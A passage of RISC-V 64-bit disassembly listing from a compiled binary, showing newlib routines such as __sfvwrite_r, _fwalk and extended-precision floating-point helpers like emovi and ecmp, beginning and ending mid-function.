   12f94:	1a078c63          	beqz	a5,1314c <__sfvwrite_r+0x1ba>
   12f98:	0105d783          	lhu	a5,16(a1)
   12f9c:	711d                	addi	sp,sp,-96
   12f9e:	e8a2                	sd	s0,80(sp)
   12fa0:	f852                	sd	s4,48(sp)
   12fa2:	f456                	sd	s5,40(sp)
   12fa4:	ec86                	sd	ra,88(sp)
   12fa6:	e4a6                	sd	s1,72(sp)
   12fa8:	e0ca                	sd	s2,64(sp)
   12faa:	fc4e                	sd	s3,56(sp)
   12fac:	f05a                	sd	s6,32(sp)
   12fae:	ec5e                	sd	s7,24(sp)
   12fb0:	e862                	sd	s8,16(sp)
   12fb2:	e466                	sd	s9,8(sp)
   12fb4:	e06a                	sd	s10,0(sp)
   12fb6:	0087f713          	andi	a4,a5,8
   12fba:	8a32                	mv	s4,a2
   12fbc:	8aaa                	mv	s5,a0
   12fbe:	842e                	mv	s0,a1
   12fc0:	c325                	beqz	a4,13020 <__sfvwrite_r+0x8e>
   12fc2:	6d98                	ld	a4,24(a1)
   12fc4:	cf31                	beqz	a4,13020 <__sfvwrite_r+0x8e>
   12fc6:	0027f713          	andi	a4,a5,2
   12fca:	000a3903          	ld	s2,0(s4)
   12fce:	c735                	beqz	a4,1303a <__sfvwrite_r+0xa8>
   12fd0:	603c                	ld	a5,64(s0)
   12fd2:	780c                	ld	a1,48(s0)
   12fd4:	80000b37          	lui	s6,0x80000
   12fd8:	4981                	li	s3,0
   12fda:	4481                	li	s1,0
   12fdc:	c00b4b13          	xori	s6,s6,-1024
   12fe0:	864e                	mv	a2,s3
   12fe2:	8556                	mv	a0,s5
   12fe4:	c885                	beqz	s1,13014 <__sfvwrite_r+0x82>
   12fe6:	86a6                	mv	a3,s1
   12fe8:	009b7363          	bgeu	s6,s1,12fee <__sfvwrite_r+0x5c>
   12fec:	86da                	mv	a3,s6
   12fee:	2681                	sext.w	a3,a3
   12ff0:	9782                	jalr	a5
   12ff2:	14a05563          	blez	a0,1313c <__sfvwrite_r+0x1aa>
   12ff6:	010a3783          	ld	a5,16(s4)
   12ffa:	99aa                	add	s3,s3,a0
   12ffc:	8c89                	sub	s1,s1,a0
   12ffe:	40a78533          	sub	a0,a5,a0
   13002:	00aa3823          	sd	a0,16(s4)
   13006:	10050763          	beqz	a0,13114 <__sfvwrite_r+0x182>
   1300a:	603c                	ld	a5,64(s0)
   1300c:	780c                	ld	a1,48(s0)
   1300e:	864e                	mv	a2,s3
   13010:	8556                	mv	a0,s5
   13012:	f8f1                	bnez	s1,12fe6 <__sfvwrite_r+0x54>
   13014:	00093983          	ld	s3,0(s2)
   13018:	00893483          	ld	s1,8(s2)
   1301c:	0941                	addi	s2,s2,16
   1301e:	b7c9                	j	12fe0 <__sfvwrite_r+0x4e>
   13020:	85a2                	mv	a1,s0
   13022:	8556                	mv	a0,s5
   13024:	e0cff0ef          	jal	ra,12630 <__swsetup_r>
   13028:	28051863          	bnez	a0,132b8 <__sfvwrite_r+0x326>
   1302c:	01045783          	lhu	a5,16(s0)
   13030:	000a3903          	ld	s2,0(s4)
   13034:	0027f713          	andi	a4,a5,2
   13038:	ff41                	bnez	a4,12fd0 <__sfvwrite_r+0x3e>
   1303a:	0017f713          	andi	a4,a5,1
   1303e:	eb35                	bnez	a4,130b2 <__sfvwrite_r+0x120>
   13040:	4444                	lw	s1,12(s0)
   13042:	6008                	ld	a0,0(s0)
   13044:	80000b37          	lui	s6,0x80000
   13048:	ffeb4b93          	xori	s7,s6,-2
   1304c:	4c01                	li	s8,0
   1304e:	4981                	li	s3,0
   13050:	fffb4b13          	not	s6,s6
   13054:	8ca6                	mv	s9,s1
   13056:	04098863          	beqz	s3,130a6 <__sfvwrite_r+0x114>
   1305a:	2007f713          	andi	a4,a5,512
   1305e:	12070a63          	beqz	a4,13192 <__sfvwrite_r+0x200>
   13062:	8d26                	mv	s10,s1
   13064:	1899f763          	bgeu	s3,s1,131f2 <__sfvwrite_r+0x260>
   13068:	8cce                	mv	s9,s3
   1306a:	8d4e                	mv	s10,s3
   1306c:	866a                	mv	a2,s10
   1306e:	85e2                	mv	a1,s8
   13070:	5b3020ef          	jal	ra,15e22 <memmove>
   13074:	4458                	lw	a4,12(s0)
   13076:	601c                	ld	a5,0(s0)
   13078:	84ce                	mv	s1,s3
   1307a:	41970cbb          	subw	s9,a4,s9
   1307e:	97ea                	add	a5,a5,s10
   13080:	01942623          	sw	s9,12(s0)
   13084:	e01c                	sd	a5,0(s0)
   13086:	4981                	li	s3,0
   13088:	010a3603          	ld	a2,16(s4)
   1308c:	9c26                	add	s8,s8,s1
   1308e:	409604b3          	sub	s1,a2,s1
   13092:	009a3823          	sd	s1,16(s4)
   13096:	ccbd                	beqz	s1,13114 <__sfvwrite_r+0x182>
   13098:	4444                	lw	s1,12(s0)
   1309a:	6008                	ld	a0,0(s0)
   1309c:	01045783          	lhu	a5,16(s0)
   130a0:	8ca6                	mv	s9,s1
   130a2:	fa099ce3          	bnez	s3,1305a <__sfvwrite_r+0xc8>
   130a6:	00093c03          	ld	s8,0(s2)
   130aa:	00893983          	ld	s3,8(s2)
   130ae:	0941                	addi	s2,s2,16
   130b0:	b755                	j	13054 <__sfvwrite_r+0xc2>
   130b2:	4981                	li	s3,0
   130b4:	4501                	li	a0,0
   130b6:	4c81                	li	s9,0
   130b8:	4c01                	li	s8,0
   130ba:	080c0b63          	beqz	s8,13150 <__sfvwrite_r+0x1be>
   130be:	c145                	beqz	a0,1315e <__sfvwrite_r+0x1cc>
   130c0:	8bce                	mv	s7,s3
   130c2:	013c7363          	bgeu	s8,s3,130c8 <__sfvwrite_r+0x136>
   130c6:	8be2                	mv	s7,s8
   130c8:	6008                	ld	a0,0(s0)
   130ca:	6c1c                	ld	a5,24(s0)
   130cc:	5014                	lw	a3,32(s0)
   130ce:	84de                	mv	s1,s7
   130d0:	00a7f763          	bgeu	a5,a0,130de <__sfvwrite_r+0x14c>
   130d4:	445c                	lw	a5,12(s0)
   130d6:	00d78b3b          	addw	s6,a5,a3
   130da:	097b4d63          	blt	s6,s7,13174 <__sfvwrite_r+0x1e2>
   130de:	18dbc463          	blt	s7,a3,13266 <__sfvwrite_r+0x2d4>
   130e2:	603c                	ld	a5,64(s0)
   130e4:	780c                	ld	a1,48(s0)
   130e6:	8666                	mv	a2,s9
   130e8:	8556                	mv	a0,s5
   130ea:	9782                	jalr	a5
   130ec:	84aa                	mv	s1,a0
   130ee:	04a05763          	blez	a0,1313c <__sfvwrite_r+0x1aa>
   130f2:	0005079b          	sext.w	a5,a0
   130f6:	40f989bb          	subw	s3,s3,a5
   130fa:	4505                	li	a0,1
   130fc:	02098b63          	beqz	s3,13132 <__sfvwrite_r+0x1a0>
   13100:	010a3783          	ld	a5,16(s4)
   13104:	9ca6                	add	s9,s9,s1
   13106:	409c0c33          	sub	s8,s8,s1
   1310a:	409784b3          	sub	s1,a5,s1
   1310e:	009a3823          	sd	s1,16(s4)
   13112:	f4c5                	bnez	s1,130ba <__sfvwrite_r+0x128>
   13114:	4501                	li	a0,0
   13116:	60e6                	ld	ra,88(sp)
   13118:	6446                	ld	s0,80(sp)
   1311a:	64a6                	ld	s1,72(sp)
   1311c:	6906                	ld	s2,64(sp)
   1311e:	79e2                	ld	s3,56(sp)
   13120:	7a42                	ld	s4,48(sp)
   13122:	7aa2                	ld	s5,40(sp)
   13124:	7b02                	ld	s6,32(sp)
   13126:	6be2                	ld	s7,24(sp)
   13128:	6c42                	ld	s8,16(sp)
   1312a:	6ca2                	ld	s9,8(sp)
   1312c:	6d02                	ld	s10,0(sp)
   1312e:	6125                	addi	sp,sp,96
   13130:	8082                	ret
   13132:	85a2                	mv	a1,s0
   13134:	8556                	mv	a0,s5
   13136:	845ff0ef          	jal	ra,1297a <_fflush_r>
   1313a:	d179                	beqz	a0,13100 <__sfvwrite_r+0x16e>
   1313c:	01041783          	lh	a5,16(s0)
   13140:	0407e793          	ori	a5,a5,64
   13144:	00f41823          	sh	a5,16(s0)
   13148:	557d                	li	a0,-1
   1314a:	b7f1                	j	13116 <__sfvwrite_r+0x184>
   1314c:	4501                	li	a0,0
   1314e:	8082                	ret
   13150:	00893c03          	ld	s8,8(s2)
   13154:	00093c83          	ld	s9,0(s2)
   13158:	0941                	addi	s2,s2,16
   1315a:	fe0c0be3          	beqz	s8,13150 <__sfvwrite_r+0x1be>
   1315e:	8662                	mv	a2,s8
   13160:	45a9                	li	a1,10
   13162:	8566                	mv	a0,s9
   13164:	343020ef          	jal	ra,15ca6 <memchr>
   13168:	12050f63          	beqz	a0,132a6 <__sfvwrite_r+0x314>
   1316c:	0505                	addi	a0,a0,1
   1316e:	419509bb          	subw	s3,a0,s9
   13172:	b7b9                	j	130c0 <__sfvwrite_r+0x12e>
   13174:	85e6                	mv	a1,s9
   13176:	865a                	mv	a2,s6
   13178:	4ab020ef          	jal	ra,15e22 <memmove>
   1317c:	601c                	ld	a5,0(s0)
   1317e:	85a2                	mv	a1,s0
   13180:	8556                	mv	a0,s5
   13182:	97da                	add	a5,a5,s6
   13184:	e01c                	sd	a5,0(s0)
   13186:	ff4ff0ef          	jal	ra,1297a <_fflush_r>
   1318a:	f94d                	bnez	a0,1313c <__sfvwrite_r+0x1aa>
   1318c:	87da                	mv	a5,s6
   1318e:	84da                	mv	s1,s6
   13190:	b79d                	j	130f6 <__sfvwrite_r+0x164>
   13192:	6c1c                	ld	a5,24(s0)
   13194:	02a7e863          	bltu	a5,a0,131c4 <__sfvwrite_r+0x232>
   13198:	501c                	lw	a5,32(s0)
   1319a:	02f9e563          	bltu	s3,a5,131c4 <__sfvwrite_r+0x232>
   1319e:	86ce                	mv	a3,s3
   131a0:	013bf363          	bgeu	s7,s3,131a6 <__sfvwrite_r+0x214>
   131a4:	86da                	mv	a3,s6
   131a6:	02f6c6bb          	divw	a3,a3,a5
   131aa:	6038                	ld	a4,64(s0)
   131ac:	780c                	ld	a1,48(s0)
   131ae:	8662                	mv	a2,s8
   131b0:	8556                	mv	a0,s5
   131b2:	02f686bb          	mulw	a3,a3,a5
   131b6:	9702                	jalr	a4
   131b8:	84aa                	mv	s1,a0
   131ba:	f8a051e3          	blez	a0,1313c <__sfvwrite_r+0x1aa>
   131be:	409989b3          	sub	s3,s3,s1
   131c2:	b5d9                	j	13088 <__sfvwrite_r+0xf6>
   131c4:	0099f363          	bgeu	s3,s1,131ca <__sfvwrite_r+0x238>
   131c8:	84ce                	mv	s1,s3
   131ca:	8626                	mv	a2,s1
   131cc:	85e2                	mv	a1,s8
   131ce:	455020ef          	jal	ra,15e22 <memmove>
   131d2:	445c                	lw	a5,12(s0)
   131d4:	6018                	ld	a4,0(s0)
   131d6:	409786bb          	subw	a3,a5,s1
   131da:	9726                	add	a4,a4,s1
   131dc:	c454                	sw	a3,12(s0)
   131de:	e018                	sd	a4,0(s0)
   131e0:	fef9                	bnez	a3,131be <__sfvwrite_r+0x22c>
   131e2:	85a2                	mv	a1,s0
   131e4:	8556                	mv	a0,s5
   131e6:	f94ff0ef          	jal	ra,1297a <_fflush_r>
   131ea:	f929                	bnez	a0,1313c <__sfvwrite_r+0x1aa>
   131ec:	409989b3          	sub	s3,s3,s1
   131f0:	bd61                	j	13088 <__sfvwrite_r+0xf6>
   131f2:	4807f713          	andi	a4,a5,1152
   131f6:	e6070be3          	beqz	a4,1306c <__sfvwrite_r+0xda>
   131fa:	5004                	lw	s1,32(s0)
   131fc:	6c0c                	ld	a1,24(s0)
   131fe:	00198713          	addi	a4,s3,1
   13202:	0014969b          	slliw	a3,s1,0x1
   13206:	9ea5                	addw	a3,a3,s1
   13208:	8d0d                	sub	a0,a0,a1
   1320a:	01f6d49b          	srliw	s1,a3,0x1f
   1320e:	00050d1b          	sext.w	s10,a0
   13212:	9cb5                	addw	s1,s1,a3
   13214:	4014d49b          	sraiw	s1,s1,0x1
   13218:	976a                	add	a4,a4,s10
   1321a:	00e4f563          	bgeu	s1,a4,13224 <__sfvwrite_r+0x292>
   1321e:	0019849b          	addiw	s1,s3,1
   13222:	9ca9                	addw	s1,s1,a0
   13224:	4007f793          	andi	a5,a5,1024
   13228:	cfa9                	beqz	a5,13282 <__sfvwrite_r+0x2f0>
   1322a:	85a6                	mv	a1,s1
   1322c:	8556                	mv	a0,s5
   1322e:	408020ef          	jal	ra,15636 <_malloc_r>
   13232:	8caa                	mv	s9,a0
   13234:	cd25                	beqz	a0,132ac <__sfvwrite_r+0x31a>
   13236:	6c0c                	ld	a1,24(s0)
   13238:	866a                	mv	a2,s10
   1323a:	30b020ef          	jal	ra,15d44 <memcpy>
   1323e:	01045783          	lhu	a5,16(s0)
   13242:	b7f7f793          	andi	a5,a5,-1153
   13246:	0807e793          	ori	a5,a5,128
   1324a:	00f41823          	sh	a5,16(s0)
   1324e:	01ac8533          	add	a0,s9,s10
   13252:	41a487bb          	subw	a5,s1,s10
   13256:	01943c23          	sd	s9,24(s0)
   1325a:	e008                	sd	a0,0(s0)
   1325c:	d004                	sw	s1,32(s0)
   1325e:	8cce                	mv	s9,s3
   13260:	c45c                	sw	a5,12(s0)
   13262:	8d4e                	mv	s10,s3
   13264:	b521                	j	1306c <__sfvwrite_r+0xda>
   13266:	865e                	mv	a2,s7
   13268:	85e6                	mv	a1,s9
   1326a:	3b9020ef          	jal	ra,15e22 <memmove>
   1326e:	4458                	lw	a4,12(s0)
   13270:	6010                	ld	a2,0(s0)
   13272:	000b879b          	sext.w	a5,s7
   13276:	4177073b          	subw	a4,a4,s7
   1327a:	965e                	add	a2,a2,s7
   1327c:	c458                	sw	a4,12(s0)
   1327e:	e010                	sd	a2,0(s0)
   13280:	bd9d                	j	130f6 <__sfvwrite_r+0x164>
   13282:	8626                	mv	a2,s1
   13284:	8556                	mv	a0,s5
   13286:	7f4030ef          	jal	ra,16a7a <_realloc_r>
   1328a:	8caa                	mv	s9,a0
   1328c:	f169                	bnez	a0,1324e <__sfvwrite_r+0x2bc>
   1328e:	6c0c                	ld	a1,24(s0)
   13290:	8556                	mv	a0,s5
   13292:	ab1ff0ef          	jal	ra,12d42 <_free_r>
   13296:	01041783          	lh	a5,16(s0)
   1329a:	4731                	li	a4,12
   1329c:	00eaa023          	sw	a4,0(s5)
   132a0:	f7f7f793          	andi	a5,a5,-129
   132a4:	bd71                	j	13140 <__sfvwrite_r+0x1ae>
   132a6:	001c099b          	addiw	s3,s8,1
   132aa:	bd19                	j	130c0 <__sfvwrite_r+0x12e>
   132ac:	4731                	li	a4,12
   132ae:	01041783          	lh	a5,16(s0)
   132b2:	00eaa023          	sw	a4,0(s5)
   132b6:	b569                	j	13140 <__sfvwrite_r+0x1ae>
   132b8:	557d                	li	a0,-1
   132ba:	bdb1                	j	13116 <__sfvwrite_r+0x184>

00000000000132bc <_fwalk>:
   132bc:	715d                	addi	sp,sp,-80
   132be:	f84a                	sd	s2,48(sp)
   132c0:	f44e                	sd	s3,40(sp)
   132c2:	f052                	sd	s4,32(sp)
   132c4:	ec56                	sd	s5,24(sp)
   132c6:	e85a                	sd	s6,16(sp)
   132c8:	e45e                	sd	s7,8(sp)
   132ca:	e486                	sd	ra,72(sp)
   132cc:	e0a2                	sd	s0,64(sp)
   132ce:	fc26                	sd	s1,56(sp)
   132d0:	8a2e                	mv	s4,a1
   132d2:	52050913          	addi	s2,a0,1312
   132d6:	4b01                	li	s6,0
   132d8:	0b000a93          	li	s5,176
   132dc:	4b85                	li	s7,1
   132de:	59fd                	li	s3,-1
   132e0:	00892783          	lw	a5,8(s2)
   132e4:	01093403          	ld	s0,16(s2)
   132e8:	02f05b63          	blez	a5,1331e <_fwalk+0x62>
   132ec:	fff7849b          	addiw	s1,a5,-1
   132f0:	1482                	slli	s1,s1,0x20
   132f2:	9081                	srli	s1,s1,0x20
   132f4:	0485                	addi	s1,s1,1
   132f6:	035484b3          	mul	s1,s1,s5
   132fa:	94a2                	add	s1,s1,s0
   132fc:	01045783          	lhu	a5,16(s0)
   13300:	00fbfb63          	bgeu	s7,a5,13316 <_fwalk+0x5a>
   13304:	01241783          	lh	a5,18(s0)
   13308:	8522                	mv	a0,s0
   1330a:	01378663          	beq	a5,s3,13316 <_fwalk+0x5a>
   1330e:	9a02                	jalr	s4
   13310:	01656b33          	or	s6,a0,s6
   13314:	2b01                	sext.w	s6,s6
   13316:	0b040413          	addi	s0,s0,176
   1331a:	fe8491e3          	bne	s1,s0,132fc <_fwalk+0x40>
   1331e:	00093903          	ld	s2,0(s2)
   13322:	fa091fe3          	bnez	s2,132e0 <_fwalk+0x24>
   13326:	60a6                	ld	ra,72(sp)
   13328:	6406                	ld	s0,64(sp)
   1332a:	74e2                	ld	s1,56(sp)
   1332c:	7942                	ld	s2,48(sp)
   1332e:	79a2                	ld	s3,40(sp)
   13330:	7a02                	ld	s4,32(sp)
   13332:	6ae2                	ld	s5,24(sp)
   13334:	6ba2                	ld	s7,8(sp)
   13336:	855a                	mv	a0,s6
   13338:	6b42                	ld	s6,16(sp)
   1333a:	6161                	addi	sp,sp,80
   1333c:	8082                	ret

000000000001333e <_fwalk_reent>:
   1333e:	715d                	addi	sp,sp,-80
   13340:	f84a                	sd	s2,48(sp)
   13342:	f44e                	sd	s3,40(sp)
   13344:	f052                	sd	s4,32(sp)
   13346:	ec56                	sd	s5,24(sp)
   13348:	e85a                	sd	s6,16(sp)
   1334a:	e45e                	sd	s7,8(sp)
   1334c:	e062                	sd	s8,0(sp)
   1334e:	e486                	sd	ra,72(sp)
   13350:	e0a2                	sd	s0,64(sp)
   13352:	fc26                	sd	s1,56(sp)
   13354:	8c2a                	mv	s8,a0
   13356:	8a2e                	mv	s4,a1
   13358:	52050913          	addi	s2,a0,1312
   1335c:	4b01                	li	s6,0
   1335e:	0b000a93          	li	s5,176
   13362:	4b85                	li	s7,1
   13364:	59fd                	li	s3,-1
   13366:	00892783          	lw	a5,8(s2)
   1336a:	01093403          	ld	s0,16(s2)
   1336e:	02f05c63          	blez	a5,133a6 <_fwalk_reent+0x68>
   13372:	fff7849b          	addiw	s1,a5,-1
   13376:	1482                	slli	s1,s1,0x20
   13378:	9081                	srli	s1,s1,0x20
   1337a:	0485                	addi	s1,s1,1
   1337c:	035484b3          	mul	s1,s1,s5
   13380:	94a2                	add	s1,s1,s0
   13382:	01045783          	lhu	a5,16(s0)
   13386:	00fbfc63          	bgeu	s7,a5,1339e <_fwalk_reent+0x60>
   1338a:	01241783          	lh	a5,18(s0)
   1338e:	85a2                	mv	a1,s0
   13390:	8562                	mv	a0,s8
   13392:	01378663          	beq	a5,s3,1339e <_fwalk_reent+0x60>
   13396:	9a02                	jalr	s4
   13398:	01656b33          	or	s6,a0,s6
   1339c:	2b01                	sext.w	s6,s6
   1339e:	0b040413          	addi	s0,s0,176
   133a2:	fe8490e3          	bne	s1,s0,13382 <_fwalk_reent+0x44>
   133a6:	00093903          	ld	s2,0(s2)
   133aa:	fa091ee3          	bnez	s2,13366 <_fwalk_reent+0x28>
   133ae:	60a6                	ld	ra,72(sp)
   133b0:	6406                	ld	s0,64(sp)
   133b2:	74e2                	ld	s1,56(sp)
   133b4:	7942                	ld	s2,48(sp)
   133b6:	79a2                	ld	s3,40(sp)
   133b8:	7a02                	ld	s4,32(sp)
   133ba:	6ae2                	ld	s5,24(sp)
   133bc:	6ba2                	ld	s7,8(sp)
   133be:	6c02                	ld	s8,0(sp)
   133c0:	855a                	mv	a0,s6
   133c2:	6b42                	ld	s6,16(sp)
   133c4:	6161                	addi	sp,sp,80
   133c6:	8082                	ret

00000000000133c8 <eshdn1>:
   133c8:	00450693          	addi	a3,a0,4
   133cc:	4781                	li	a5,0
   133ce:	0569                	addi	a0,a0,26
   133d0:	7861                	lui	a6,0xffff8
   133d2:	a811                	j	133e6 <eshdn1+0x1e>
   133d4:	0017979b          	slliw	a5,a5,0x1
   133d8:	00e69023          	sh	a4,0(a3)
   133dc:	17c2                	slli	a5,a5,0x30
   133de:	0689                	addi	a3,a3,2
   133e0:	93c1                	srli	a5,a5,0x30
   133e2:	02d50863          	beq	a0,a3,13412 <eshdn1+0x4a>
   133e6:	0006d703          	lhu	a4,0(a3)
   133ea:	00177613          	andi	a2,a4,1
   133ee:	c219                	beqz	a2,133f4 <eshdn1+0x2c>
   133f0:	0017e793          	ori	a5,a5,1
   133f4:	8305                	srli	a4,a4,0x1
   133f6:	0027f613          	andi	a2,a5,2
   133fa:	010765b3          	or	a1,a4,a6
   133fe:	da79                	beqz	a2,133d4 <eshdn1+0xc>
   13400:	0017979b          	slliw	a5,a5,0x1
   13404:	00b69023          	sh	a1,0(a3)
   13408:	17c2                	slli	a5,a5,0x30
   1340a:	0689                	addi	a3,a3,2
   1340c:	93c1                	srli	a5,a5,0x30
   1340e:	fcd51ce3          	bne	a0,a3,133e6 <eshdn1+0x1e>
   13412:	8082                	ret

0000000000013414 <eshup1>:
   13414:	01850693          	addi	a3,a0,24
   13418:	4701                	li	a4,0
   1341a:	0509                	addi	a0,a0,2
   1341c:	a811                	j	13430 <eshup1+0x1c>
   1341e:	0017171b          	slliw	a4,a4,0x1
   13422:	00f69023          	sh	a5,0(a3)
   13426:	1742                	slli	a4,a4,0x30
   13428:	16f9                	addi	a3,a3,-2
   1342a:	9341                	srli	a4,a4,0x30
   1342c:	04d50063          	beq	a0,a3,1346c <eshup1+0x58>
   13430:	0006d783          	lhu	a5,0(a3)
   13434:	0107961b          	slliw	a2,a5,0x10
   13438:	4106561b          	sraiw	a2,a2,0x10
   1343c:	02061593          	slli	a1,a2,0x20
   13440:	0017979b          	slliw	a5,a5,0x1
   13444:	0005d463          	bgez	a1,1344c <eshup1+0x38>
   13448:	00176713          	ori	a4,a4,1
   1344c:	17c2                	slli	a5,a5,0x30
   1344e:	93c1                	srli	a5,a5,0x30
   13450:	00277613          	andi	a2,a4,2
   13454:	0017e593          	ori	a1,a5,1
   13458:	d279                	beqz	a2,1341e <eshup1+0xa>
   1345a:	0017171b          	slliw	a4,a4,0x1
   1345e:	00b69023          	sh	a1,0(a3)
   13462:	1742                	slli	a4,a4,0x30
   13464:	16f9                	addi	a3,a3,-2
   13466:	9341                	srli	a4,a4,0x30
   13468:	fcd514e3          	bne	a0,a3,13430 <eshup1+0x1c>
   1346c:	8082                	ret

000000000001346e <m16m>:
   1346e:	1101                	addi	sp,sp,-32
   13470:	6e41                	lui	t3,0x10
   13472:	00011b23          	sh	zero,22(sp)
   13476:	00011c23          	sh	zero,24(sp)
   1347a:	05e1                	addi	a1,a1,24
   1347c:	083c                	addi	a5,sp,24
   1347e:	00410813          	addi	a6,sp,4
   13482:	1e7d                	addi	t3,t3,-1
   13484:	0005d703          	lhu	a4,0(a1)
   13488:	17f9                	addi	a5,a5,-2
   1348a:	15f9                	addi	a1,a1,-2
   1348c:	e315                	bnez	a4,134b0 <m16m+0x42>
   1348e:	fe079f23          	sh	zero,-2(a5)
   13492:	ff0799e3          	bne	a5,a6,13484 <m16m+0x16>
   13496:	0611                	addi	a2,a2,4
   13498:	01a10693          	addi	a3,sp,26
   1349c:	0007d703          	lhu	a4,0(a5)
   134a0:	0789                	addi	a5,a5,2
   134a2:	0609                	addi	a2,a2,2
   134a4:	fee61f23          	sh	a4,-2(a2)
   134a8:	fed79ae3          	bne	a5,a3,1349c <m16m+0x2e>
   134ac:	6105                	addi	sp,sp,32
   134ae:	8082                	ret
   134b0:	02a70733          	mul	a4,a4,a0
   134b4:	0027d883          	lhu	a7,2(a5)
   134b8:	0007d303          	lhu	t1,0(a5)
   134bc:	01c776b3          	and	a3,a4,t3
   134c0:	96c6                	add	a3,a3,a7
   134c2:	8341                	srli	a4,a4,0x10
   134c4:	0106d893          	srli	a7,a3,0x10
   134c8:	971a                	add	a4,a4,t1
   134ca:	9746                	add	a4,a4,a7
   134cc:	01075893          	srli	a7,a4,0x10
   134d0:	00d79123          	sh	a3,2(a5)
   134d4:	00e79023          	sh	a4,0(a5)
   134d8:	ff179f23          	sh	a7,-2(a5)
   134dc:	fb0794e3          	bne	a5,a6,13484 <m16m+0x16>
   134e0:	bf5d                	j	13496 <m16m+0x28>

00000000000134e2 <eisnan.part.0>:
   134e2:	01250713          	addi	a4,a0,18
   134e6:	00055783          	lhu	a5,0(a0)
   134ea:	0509                	addi	a0,a0,2
   134ec:	e789                	bnez	a5,134f6 <eisnan.part.0+0x14>
   134ee:	fee51ce3          	bne	a0,a4,134e6 <eisnan.part.0+0x4>
   134f2:	4501                	li	a0,0
   134f4:	8082                	ret
   134f6:	4505                	li	a0,1
   134f8:	8082                	ret

00000000000134fa <eneg>:
   134fa:	1101                	addi	sp,sp,-32
   134fc:	e426                	sd	s1,8(sp)
   134fe:	01255483          	lhu	s1,18(a0)
   13502:	e822                	sd	s0,16(sp)
   13504:	ec06                	sd	ra,24(sp)
   13506:	fff4c793          	not	a5,s1
   1350a:	03179713          	slli	a4,a5,0x31
   1350e:	842a                	mv	s0,a0
   13510:	e701                	bnez	a4,13518 <eneg+0x1e>
   13512:	fd1ff0ef          	jal	ra,134e2 <eisnan.part.0>
   13516:	e509                	bnez	a0,13520 <eneg+0x26>
   13518:	77e1                	lui	a5,0xffff8
   1351a:	8cbd                	xor	s1,s1,a5
   1351c:	00941923          	sh	s1,18(s0)
   13520:	60e2                	ld	ra,24(sp)
   13522:	6442                	ld	s0,16(sp)
   13524:	64a2                	ld	s1,8(sp)
   13526:	6105                	addi	sp,sp,32
   13528:	8082                	ret

000000000001352a <eisneg>:
   1352a:	1141                	addi	sp,sp,-16
   1352c:	e022                	sd	s0,0(sp)
   1352e:	01255403          	lhu	s0,18(a0)
   13532:	e406                	sd	ra,8(sp)
   13534:	fff44793          	not	a5,s0
   13538:	03179713          	slli	a4,a5,0x31
   1353c:	e711                	bnez	a4,13548 <eisneg+0x1e>
   1353e:	fa5ff0ef          	jal	ra,134e2 <eisnan.part.0>
   13542:	87aa                	mv	a5,a0
   13544:	4501                	li	a0,0
   13546:	e399                	bnez	a5,1354c <eisneg+0x22>
   13548:	00f45513          	srli	a0,s0,0xf
   1354c:	60a2                	ld	ra,8(sp)
   1354e:	6402                	ld	s0,0(sp)
   13550:	0141                	addi	sp,sp,16
   13552:	8082                	ret

0000000000013554 <emovi>:
   13554:	01255783          	lhu	a5,18(a0)
   13558:	7139                	addi	sp,sp,-64
   1355a:	f822                	sd	s0,48(sp)
   1355c:	00f7d79b          	srliw	a5,a5,0xf
   13560:	f426                	sd	s1,40(sp)
   13562:	fc06                	sd	ra,56(sp)
   13564:	f04a                	sd	s2,32(sp)
   13566:	ec4e                	sd	s3,24(sp)
   13568:	40f007bb          	negw	a5,a5
   1356c:	00f59023          	sh	a5,0(a1)
   13570:	01255783          	lhu	a5,18(a0)
   13574:	6721                	lui	a4,0x8
   13576:	177d                	addi	a4,a4,-1
   13578:	8ff9                	and	a5,a5,a4
   1357a:	00f59123          	sh	a5,2(a1)
   1357e:	84aa                	mv	s1,a0
   13580:	01050413          	addi	s0,a0,16
   13584:	02e78863          	beq	a5,a4,135b4 <emovi+0x60>
   13588:	00658793          	addi	a5,a1,6
   1358c:	00059223          	sh	zero,4(a1)
   13590:	1579                	addi	a0,a0,-2
   13592:	00045703          	lhu	a4,0(s0)
   13596:	1479                	addi	s0,s0,-2
   13598:	0789                	addi	a5,a5,2
   1359a:	fee79f23          	sh	a4,-2(a5) # ffffffffffff7ffe <__BSS_END__+0xfffffffffffc00de>
   1359e:	fe851ae3          	bne	a0,s0,13592 <emovi+0x3e>
   135a2:	00059c23          	sh	zero,24(a1)
   135a6:	70e2                	ld	ra,56(sp)
   135a8:	7442                	ld	s0,48(sp)
   135aa:	74a2                	ld	s1,40(sp)
   135ac:	7902                	ld	s2,32(sp)
   135ae:	69e2                	ld	s3,24(sp)
   135b0:	6121                	addi	sp,sp,64
   135b2:	8082                	ret
   135b4:	0007869b          	sext.w	a3,a5
   135b8:	01255783          	lhu	a5,18(a0)
   135bc:	00458913          	addi	s2,a1,4
   135c0:	8ff5                	and	a5,a5,a3
   135c2:	02d79663          	bne	a5,a3,135ee <emovi+0x9a>
   135c6:	e42e                	sd	a1,8(sp)
   135c8:	f1bff0ef          	jal	ra,134e2 <eisnan.part.0>
   135cc:	65a2                	ld	a1,8(sp)
   135ce:	c105                	beqz	a0,135ee <emovi+0x9a>
   135d0:	00658793          	addi	a5,a1,6
   135d4:	00059223          	sh	zero,4(a1)
   135d8:	ffc48513          	addi	a0,s1,-4
   135dc:	00045703          	lhu	a4,0(s0)
   135e0:	1479                	addi	s0,s0,-2
   135e2:	0789                	addi	a5,a5,2
   135e4:	fee79f23          	sh	a4,-2(a5)
   135e8:	fe851ae3          	bne	a0,s0,135dc <emovi+0x88>
   135ec:	bf6d                	j	135a6 <emovi+0x52>
   135ee:	01a58993          	addi	s3,a1,26
   135f2:	0909                	addi	s2,s2,2
   135f4:	fe091f23          	sh	zero,-2(s2)
   135f8:	ff299de3          	bne	s3,s2,135f2 <emovi+0x9e>
   135fc:	70e2                	ld	ra,56(sp)
   135fe:	7442                	ld	s0,48(sp)
   13600:	74a2                	ld	s1,40(sp)
   13602:	7902                	ld	s2,32(sp)
   13604:	69e2                	ld	s3,24(sp)
   13606:	6121                	addi	sp,sp,64
   13608:	8082                	ret

000000000001360a <ecmp>:
   1360a:	01255783          	lhu	a5,18(a0)
   1360e:	711d                	addi	sp,sp,-96
   13610:	e8a2                	sd	s0,80(sp)
   13612:	fff7c793          	not	a5,a5
   13616:	e4a6                	sd	s1,72(sp)
   13618:	ec86                	sd	ra,88(sp)
   1361a:	03179713          	slli	a4,a5,0x31
   1361e:	84aa                	mv	s1,a0
   13620:	842e                	mv	s0,a1
   13622:	e701                	bnez	a4,1362a <ecmp+0x20>
   13624:	ebfff0ef          	jal	ra,134e2 <eisnan.part.0>
